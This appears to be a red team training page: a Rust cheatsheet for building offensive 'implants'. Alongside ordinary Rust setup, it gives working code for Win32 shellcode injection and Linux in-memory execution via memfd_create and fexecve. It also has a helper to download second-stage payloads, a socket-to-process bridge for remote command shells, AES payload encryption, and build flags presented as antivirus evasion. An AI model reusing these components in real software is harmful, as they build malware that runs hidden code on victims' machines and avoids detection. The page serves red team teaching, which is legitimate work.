---
layout: training-page
title: "Rust Red Team Cheatsheet — Red Team Academy"
module: "Programming"
tags:
  - rust
  - cheatsheet
  - red-team
  - offensive-programming
page_key: "prog-rust-cheatsheet"
render_with_liquid: false
---

# Rust Red Team Cheatsheet

Rust is increasingly the language of choice for offensive tooling. It compiles to small, fast native binaries with no runtime overhead, has a rich FFI story for calling Win32 APIs, and the borrow checker eliminates entire classes of memory bugs that would make C payloads unreliable. This cheatsheet covers everything you need to go from zero to working offensive Rust: project setup, cross-compilation, async networking, Windows APIs, cryptography, HTTP beaconing, and build-time evasion flags.

---

## 1. Cargo and Project Setup

### Starter Cargo.toml for Offensive Tools

```toml
[package]
name        = "implant"
version     = "0.1.0"
edition     = "2021"
description = "Red team implant"

# Minimize binary metadata
[package.metadata]
authors = []

[dependencies]
# Async runtime — full feature set for networking, time, process, io
tokio       = { version = "1",    features = ["full"] }

# HTTP client — rustls for pure-Rust TLS (no OpenSSL dependency)
reqwest     = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }

# CLI argument parsing via derive macros
clap        = { version = "4",    features = ["derive"] }

# Serialization / deserialization
serde       = { version = "1",    features = ["derive"] }
serde_json  = "1"

# AES block cipher (RustCrypto)
aes         = "0.8"
# CBC mode
cbc         = "0.1"

# Base64 encoding/decoding
base64      = "0.22"

# Windows API bindings — list only the feature groups you need
[target.'cfg(windows)'.dependencies]
windows-sys = { version = "0.59", features = [
    "Win32_Foundation",
    "Win32_System_Memory",
    "Win32_System_Threading",
    "Win32_System_Diagnostics_Debug",
    "Win32_Security",
    "Win32_System_LibraryLoader",
    "Win32_NetworkManagement_IpHelper",
] }

# Error handling
anyhow      = "1"
thiserror   = "2"

# UUID generation
uuid        = { version = "1", features = ["v4"] }

# Logging
env_logger  = "0.11"
log         = "0.4"

[profile.release]
opt-level     = 3        # Full optimizations
strip         = true     # Strip debug symbols from binary
lto           = true     # Link-time optimization (smaller, harder to reverse)
panic         = "abort"  # Remove panic unwinding code (smaller binary)
codegen-units = 1        # Single codegen unit for maximum optimization
```

### Project Layout

```
implant/
├── Cargo.toml
├── .cargo/
│   └── config.toml      # Cross-compilation linker settings
├── src/
│   ├── main.rs          # Entry point
│   ├── crypto.rs        # AES encrypt/decrypt
│   ├── network.rs       # HTTP / TCP comms
│   ├── exec.rs          # Command execution
│   └── platform/
│       ├── mod.rs
│       ├── windows.rs   # Win32 API calls
│       └── linux.rs     # Linux-specific code
└── build.rs             # Optional: linker script injection
```

---

## 2. Cross-Compilation

### Install Targets

```bash
# Windows targets from Linux
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-pc-windows-msvc    # requires MSVC linker
rustup target add i686-pc-windows-gnu

# Linux targets
rustup target add x86_64-unknown-linux-musl  # statically linked
rustup target add aarch64-unknown-linux-gnu  # ARM64

# Install mingw linker on Debian/Ubuntu
sudo apt-get install -y gcc-mingw-w64-x86-64
```

### .cargo/config.toml — Linker Setup

```toml
[target.x86_64-pc-windows-gnu]
linker  = "x86_64-w64-mingw32-gcc"
ar      = "x86_64-w64-mingw32-ar"

[target.x86_64-unknown-linux-musl]
linker  = "x86_64-linux-musl-gcc"

[target.aarch64-unknown-linux-gnu]
linker  = "aarch64-linux-gnu-gcc"

# Strip all binaries in release builds
[profile.release]
strip = true
```

### Build Commands

```bash
# Build for Windows x64 from Linux
cargo build --release --target x86_64-pc-windows-gnu

# Build static Linux binary (no glibc dependency)
RUSTFLAGS="-C target-feature=+crt-static" \
    cargo build --release --target x86_64-unknown-linux-musl

# Minimize binary size: size-optimize instead of speed-optimize
RUSTFLAGS="-C opt-level=z" cargo build --release --target x86_64-pc-windows-gnu

# Environment variable alternative to .cargo/config.toml
CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER=x86_64-w64-mingw32-gcc \
    cargo build --release --target x86_64-pc-windows-gnu
```

---

## 3. Async Networking (Tokio)

### TCP Client

```rust
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{timeout, Duration};
use std::io;

async fn connect_with_timeout(addr: &str, timeout_ms: u64) -> io::Result<TcpStream> {
    let dur    = Duration::from_millis(timeout_ms);
    let stream = timeout(dur, TcpStream::connect(addr))
        .await
        .map_err(|_| io::Error::new(io::ErrorKind::TimedOut, "connection timed out"))??;
    Ok(stream)
}

async fn send_recv(stream: &mut TcpStream, data: &[u8]) -> io::Result<Vec<u8>> {
    stream.write_all(data).await?;
    let mut buf = vec![0u8; 4096];
    let n = stream.read(&mut buf).await?;
    buf.truncate(n);
    Ok(buf)
}
```

### TCP Listener

```rust
use tokio::net::TcpListener;

async fn run_listener(addr: &str) -> io::Result<()> {
    let listener = TcpListener::bind(addr).await?;
    loop {
        let (mut socket, peer) = listener.accept().await?;
        tokio::spawn(async move {
            let mut buf = [0u8; 1024];
            loop {
                match socket.read(&mut buf).await {
                    Ok(0)  => break,               // connection closed
                    Ok(n)  => { /* handle buf[..n] */ }
                    Err(_) => break,
                }
            }
        });
    }
}
```

### Concurrency Control with Semaphore

```rust
use tokio::sync::Semaphore;
use std::sync::Arc;

// Allow at most 100 concurrent connections
let sem = Arc::new(Semaphore::new(100));

for target in targets {
    let sem   = Arc::clone(&sem);
    let target = target.clone();
    tokio::spawn(async move {
        let _permit = sem.acquire().await.unwrap();  // blocks when full
        // do work — permit released when _permit drops
        scan_target(&target).await;
    });
}
```

### tokio::select! for Bidirectional I/O

```rust
use tokio::io::{AsyncBufReadExt, BufReader};

async fn bridge(mut net: TcpStream, mut proc_stdout: tokio::process::ChildStdout) {
    let (net_read, mut net_write) = net.split();
    let mut net_lines  = BufReader::new(net_read).lines();
    let mut proc_lines = BufReader::new(proc_stdout).lines();

    loop {
        tokio::select! {
            line = net_lines.next_line() => {
                match line {
                    Ok(Some(cmd)) => { /* send cmd to process stdin */ }
                    _             => break,
                }
            }
            line = proc_lines.next_line() => {
                match line {
                    Ok(Some(out)) => {
                        net_write.write_all(out.as_bytes()).await.ok();
                    }
                    _ => break,
                }
            }
        }
    }
}
```

---

## 4. Windows API (windows-sys)

### Required Cargo.toml Features

```toml
[target.'cfg(windows)'.dependencies]
windows-sys = { version = "0.59", features = [
    "Win32_Foundation",           # HANDLE, BOOL, LPVOID, etc.
    "Win32_System_Memory",        # VirtualAlloc, VirtualProtect
    "Win32_System_Threading",     # CreateThread, OpenProcess
    "Win32_System_Diagnostics_Debug",  # WriteProcessMemory
    "Win32_Security",             # Privileges, SIDs
    "Win32_System_LibraryLoader", # GetModuleHandle, GetProcAddress
] }
```

### Common Win32 Patterns

```rust
#[cfg(windows)]
mod win32 {
    use windows_sys::Win32::Foundation::{HANDLE, BOOL, FALSE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect,
        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
    };
    use windows_sys::Win32::System::Threading::{
        CreateThread, WaitForSingleObject, INFINITE,
    };
    use windows_sys::Win32::System::Diagnostics::Debug::{
        WriteProcessMemory,
    };
    use std::ptr;
    use std::ffi::c_void;

    /// Allocate RW memory, copy shellcode, flip to RX, execute in new thread.
    pub unsafe fn inject_shellcode(shellcode: &[u8]) -> bool {
        // 1. Allocate RW memory for shellcode
        let base = VirtualAlloc(
            ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() { return false; }

        // 2. Copy shellcode bytes
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base as *mut u8, shellcode.len());

        // 3. Make memory executable (RX)
        let mut old_protect: u32 = 0;
        let ok = VirtualProtect(base, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);
        if ok == FALSE { return false; }

        // 4. Spawn a thread to execute the shellcode
        let thread = CreateThread(
            ptr::null(),            // security attributes
            0,                      // default stack size
            Some(std::mem::transmute(base)), // function pointer
            ptr::null(),            // parameter
            0,                      // creation flags
            ptr::null_mut(),        // thread ID output
        );
        if thread == 0 || thread == INVALID_HANDLE_VALUE {
            return false;
        }

        // 5. Wait for thread to finish
        WaitForSingleObject(thread, INFINITE);
        true
    }

    /// Check last Win32 error
    pub fn last_error() -> u32 {
        unsafe { windows_sys::Win32::Foundation::GetLastError() }
    }
}
```

---

## 5. FFI and Unsafe Patterns

### Calling C Functions

```rust
use std::ffi::{CString, CStr};
use std::os::raw::{c_char, c_int, c_void};

// Declare external C functions
extern "C" {
    fn strlen(s: *const c_char) -> usize;
    fn malloc(size: usize) -> *mut c_void;
    fn free(ptr: *mut c_void);
}

// Using CString: Rust String → null-terminated C string
fn rust_to_c(s: &str) -> CString {
    CString::new(s).expect("CString::new failed — interior null byte")
}

// Using CStr: raw C pointer → Rust &str
unsafe fn c_to_rust(ptr: *const c_char) -> &'static str {
    CStr::from_ptr(ptr)
        .to_str()
        .expect("invalid UTF-8 in C string")
}

// Reading raw memory as a slice
unsafe fn read_buffer(ptr: *const u8, len: usize) -> &'static [u8] {
    std::slice::from_raw_parts(ptr, len)
}

// Windows "system" calling convention
extern "system" {
    fn MessageBoxW(
        hwnd:    *mut c_void,
        text:    *const u16,
        caption: *const u16,
        utype:   u32,
    ) -> c_int;
}
```

### transmute for Function Pointers

```rust
// Cast a raw pointer to a function pointer — use sparingly
unsafe fn call_as_fn(addr: *const u8) {
    type ShellcodeFn = unsafe extern "C" fn();
    let f: ShellcodeFn = std::mem::transmute(addr);
    f();
}
```

---

## 6. Cryptography (RustCrypto — aes + cbc)

```rust
use aes::Aes256;
use cbc::{Encryptor, Decryptor};
use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};
use aes::cipher::generic_array::GenericArray;

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

/// Encrypt plaintext with AES-256-CBC. Returns IV (16 bytes) + ciphertext.
pub fn encrypt(key: &[u8; 32], iv: &[u8; 16], plaintext: &[u8]) -> Vec<u8> {
    let key_ga = GenericArray::from_slice(key);
    let iv_ga  = GenericArray::from_slice(iv);
    let cipher = Aes256CbcEnc::new(key_ga, iv_ga);

    // encrypt_padded_vec_mut allocates and handles PKCS7 padding
    let ciphertext = cipher.encrypt_padded_vec_mut::<Pkcs7>(plaintext);

    // Prepend IV so the receiver can decrypt without an out-of-band channel
    let mut output = Vec::with_capacity(16 + ciphertext.len());
    output.extend_from_slice(iv);
    output.extend_from_slice(&ciphertext);
    output
}

/// Decrypt an AES-256-CBC blob with prepended IV.
pub fn decrypt(key: &[u8; 32], blob: &[u8]) -> anyhow::Result<Vec<u8>> {
    anyhow::ensure!(blob.len() > 16, "blob too short to contain IV");
    let (iv_bytes, cipher_bytes) = blob.split_at(16);

    let key_ga = GenericArray::from_slice(key);
    let iv_ga  = GenericArray::from_slice(iv_bytes);
    let cipher = Aes256CbcDec::new(key_ga, iv_ga);

    cipher
        .decrypt_padded_vec_mut::<Pkcs7>(cipher_bytes)
        .map_err(|e| anyhow::anyhow!("decryption failed: {:?}", e))
}

// Generate a random IV
use rand::RngCore;
fn random_iv() -> [u8; 16] {
    let mut iv = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut iv);
    iv
}
```

---

## 7. HTTP Client (reqwest)

```rust
use reqwest::{Client, Proxy, header};
use std::time::Duration;

/// Build a configured reqwest Client.
async fn build_client(
    proxy_url: Option<&str>,
    skip_tls:  bool,
) -> anyhow::Result<Client> {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(skip_tls)  // lab use only
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

    if let Some(url) = proxy_url {
        builder = builder.proxy(Proxy::all(url)?);
    }

    Ok(builder.build()?)
}

/// POST JSON and receive a JSON response.
async fn post_json<T: serde::Serialize, R: serde::de::DeserializeOwned>(
    client:   &Client,
    url:      &str,
    payload:  &T,
    auth_hdr: Option<&str>,
) -> anyhow::Result<R> {
    let mut req = client.post(url).json(payload);

    if let Some(token) = auth_hdr {
        req = req.header(header::AUTHORIZATION, format!("Bearer {token}"));
    }

    let resp = req.send().await?.error_for_status()?;
    Ok(resp.json::<R>().await?)
}

/// Download raw bytes (shellcode, stage2, etc.)
async fn download_bytes(client: &Client, url: &str) -> anyhow::Result<Vec<u8>> {
    let bytes = client.get(url).send().await?.error_for_status()?.bytes().await?;
    Ok(bytes.to_vec())
}
```

---

## 8. Error Handling

### anyhow for Application Code

```rust
use anyhow::{Context, Result};

fn read_config(path: &str) -> Result<String> {
    std::fs::read_to_string(path)
        .with_context(|| format!("failed to read config file: {path}"))
}

async fn run() -> Result<()> {
    let cfg = read_config("config.json")?;
    // ? operator propagates anyhow::Error with context
    Ok(())
}
```

### thiserror for Library / Module Error Types

```rust
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ImplantError {
    #[error("network error: {0}")]
    Network(#[from] reqwest::Error),

    #[error("crypto error: {msg}")]
    Crypto { msg: String },

    #[error("command execution failed with exit code {code}")]
    Execution { code: i32 },

    #[error(transparent)]
    Io(#[from] std::io::Error),
}

// Functions returning your custom error type
fn run_cmd(cmd: &str) -> Result<String, ImplantError> {
    let out = std::process::Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
        .map_err(ImplantError::Io)?;

    if !out.status.success() {
        return Err(ImplantError::Execution {
            code: out.status.code().unwrap_or(-1),
        });
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}
```

---

## 9. Build Flags for Evasion

### Static Linking (no external DLL dependencies)

```bash
# Static CRT on Windows — no MSVCRT.dll or VCRUNTIME dependency
RUSTFLAGS="-C target-feature=+crt-static" cargo build --release --target x86_64-pc-windows-gnu

# Full musl static on Linux
RUSTFLAGS="-C target-feature=+crt-static" cargo build --release --target x86_64-unknown-linux-musl
```

### Size Minimization

```bash
# Optimize for binary size instead of speed
RUSTFLAGS="-C opt-level=z -C panic=abort" cargo build --release

# Combine with Cargo.toml profile settings
[profile.release]
opt-level     = "z"
strip         = true
lto           = true
panic         = "abort"
codegen-units = 1
```

### Strip Symbols

```bash
# Via Cargo.toml (Rust 1.59+)
[profile.release]
strip = true

# Manual strip after build (guaranteed)
strip target/x86_64-pc-windows-gnu/release/implant.exe

# On macOS
strip -x target/release/implant
```

### Post-Processing

```bash
# UPX compression — reduces binary size, adds packer signature
# Avoid on implants where packer signatures are detected
upx --best --lzma target/release/implant.exe

# Check final binary size
ls -lh target/x86_64-pc-windows-gnu/release/implant.exe
```

### PE Section Name Obfuscation (build.rs)

```rust
// build.rs — rename default .text section via linker flags
fn main() {
    if std::env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
        println!("cargo:rustc-link-arg=/SECTION:.text,.data,.rdata");
        // Or use a custom linker script for more control
    }
}
```

---

## 10. Useful Patterns

### In-Memory Shellcode Execution (Linux — memfd_create)

```rust
use std::io::Write;
use std::os::unix::io::FromRawFd;

fn execute_shellcode_memfd(shellcode: &[u8]) -> anyhow::Result<()> {
    unsafe {
        // Create anonymous in-memory file — no filesystem entry
        let name = b".\0";
        let fd   = libc::syscall(libc::SYS_memfd_create, name.as_ptr(), 1u64) as i32;
        anyhow::ensure!(fd >= 0, "memfd_create failed");

        let mut f = std::fs::File::from_raw_fd(fd);
        f.write_all(shellcode)?;

        // fexecve: execute from file descriptor
        let argv: Vec<*const libc::c_char> = vec![std::ptr::null()];
        let envp: Vec<*const libc::c_char> = vec![std::ptr::null()];
        libc::fexecve(fd, argv.as_ptr(), envp.as_ptr());
    }
    Ok(())
}
```

### clap Derive Macro for CLI Args

```rust
use clap::Parser;
use std::path::PathBuf;

#[derive(Parser, Debug)]
#[command(name = "scanner", about = "Async port scanner")]
pub struct Args {
    /// Target host or CIDR range
    #[arg(short, long)]
    pub host: String,

    /// Port range or list: "1-1024" or "22,80,443,3389"
    #[arg(short, long, default_value = "1-1024")]
    pub ports: String,

    /// Max concurrent connections
    #[arg(short, long, default_value_t = 500)]
    pub concurrency: u32,

    /// Connection timeout in milliseconds
    #[arg(short, long, default_value_t = 1000)]
    pub timeout_ms: u64,

    /// Write JSON results to this file
    #[arg(short, long)]
    pub output: Option<PathBuf>,
}
```

### env_logger Setup

```rust
fn main() {
    // Set RUST_LOG=debug or RUST_LOG=implant=trace to control verbosity
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("warn")
    ).init();

    log::info!("implant starting");
    log::debug!("debug detail here");
    log::error!("something failed");
}
```

### base64 Encode/Decode

```rust
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};

fn b64_encode(data: &[u8]) -> String {
    B64.encode(data)
}

fn b64_decode(s: &str) -> anyhow::Result<Vec<u8>> {
    B64.decode(s).map_err(|e| anyhow::anyhow!("base64 decode: {e}"))
}
```

---

## Quick Reference: Useful One-Liners

```bash
# New project
cargo new --bin implant && cd implant

# Check compile without linking (fast syntax check)
cargo check

# Build release for current platform
cargo build --release

# Build Windows exe from Linux
cargo build --release --target x86_64-pc-windows-gnu

# Run with verbose logging
RUST_LOG=debug cargo run -- --host 192.168.1.0/24

# Audit dependencies for known vulnerabilities
cargo install cargo-audit && cargo audit

# Show dependency tree
cargo tree

# Show binary sections and symbols
objdump -h target/release/implant
nm target/release/implant | grep -i main
```

---

## Resources

- [The Rust Programming Language Book](https://doc.rust-lang.org/book/)
- [tokio.rs — Async Runtime Documentation](https://tokio.rs/)
- [RustCrypto — AES, CBC, and other primitives](https://github.com/RustCrypto)
- [windows-sys crate — crates.io](https://crates.io/crates/windows-sys)
- [reqwest — HTTP client documentation](https://docs.rs/reqwest)
- [clap — CLI parsing](https://docs.rs/clap)
- [anyhow — Error handling](https://docs.rs/anyhow)
- [thiserror — Custom error types](https://docs.rs/thiserror)
- [Offensive Rust — trickster0](https://github.com/trickster0/OffensiveRust)
- [Rust for Malware Development — maldev.net](https://maldevacademy.com/)
